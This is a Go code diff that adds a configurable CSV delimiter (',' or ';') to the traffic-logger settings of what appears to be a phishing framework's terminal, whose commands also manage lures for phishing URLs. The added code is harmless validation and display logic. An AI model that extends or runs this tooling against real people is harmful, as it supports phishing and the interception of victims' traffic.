@@ -981,6 +981,13 @@ func (t *Terminal) handleTrafficloggers(args []string) error {
 					do_update = true
 					log.Info("filename = '%s", l.Filename)
 					log.Warning("Changing the filename here does not rename the existing logfile!")
+				case "delimiter":
+					if !(val == "," || val == ";") {
+						return fmt.Errorf("edit: invalid delimiter %s. Can only be ',' or ';'", val)
+					}
+					l.Delimiter = []byte(val)[0]
+					do_update = true
+					log.Info("delimiter = '%s'", string(l.Delimiter))
 				}
 			}
 			if do_update {
@@ -1542,7 +1549,8 @@ func (t *Terminal) createHelp() {
 					readline.PcItem("enable"),
 					readline.PcItem("disable"),
 					readline.PcItem("type", readline.PcItemDynamic(t.trafficloggerValidType)),
-					readline.PcItem("filename"))),
+					readline.PcItem("filename"),
+					readline.PcItem("delimiter", readline.PcItemDynamic(t.trafficloggerValidDelimiter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 	h.AddSubCommand("trafficloggers", nil, "", "show all trafficloggers")
 	h.AddSubCommand("trafficloggers", nil, "<id>", "show details of a trafficlogger with a given <id>")
@@ -1553,6 +1561,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("trafficloggers", []string{"edit", "disable"}, "edit <id> enable", "disables trafficlogger with a given <id>")
 	h.AddSubCommand("trafficloggers", []string{"edit", "type"}, "edit <id> type <type>", "sets the type for a trafficlogger with a given <id> to <type>")
 	h.AddSubCommand("trafficloggers", []string{"edit", "filename"}, "edit <id> filename <filename>", "sets the file a trafficlogger with a given <id> is written to to <filename>")
+	h.AddSubCommand("trafficloggers", []string{"edit", "delimiter"}, "edit <id> delimiter <delimiter>", "sets the delmiter of the csv file. possible options are ',' or ';'.")
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		/*		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"),
@@ -2116,6 +2125,15 @@ func (t *Terminal) trafficloggerValidType(args string) []string {
 	return ret
 }
 
+func (t *Terminal) trafficloggerValidDelimiter(args string) []string {
+	var ret []string
+	tldelimiters := []string{",", ";"}
+	for _, e := range tldelimiters {
+		ret = append(ret, e)
+	}
+	return ret
+}
+
 func (t *Terminal) sprintTrafficloggers() string {
 	//higreen := color.New(color.FgHiGreen)
 	//green := color.New(color.FgGreen)
@@ -2126,10 +2144,10 @@ func (t *Terminal) sprintTrafficloggers() string {
 	hcyan := color.New(color.FgHiCyan)
 	//white := color.New(color.FgHiWhite)
 	//n := 0
-	cols := []string{"id", "enabled", "type", "filename"}
+	cols := []string{"id", "enabled", "type", "filename", "delimiter"}
 	var rows [][]string
 	for l, L := range t.cfg.trafficloggers {
-		rows = append(rows, []string{strconv.Itoa(l), hiblue.Sprint(L.Enabled), cyan.Sprint(L.Type), hcyan.Sprint(L.Filename)})
+		rows = append(rows, []string{strconv.Itoa(l), hiblue.Sprint(L.Enabled), cyan.Sprint(L.Type), hcyan.Sprint(L.Filename), hcyan.Sprint(string(L.Delimiter))})
 	}
 	return AsTable(cols, rows)
 }
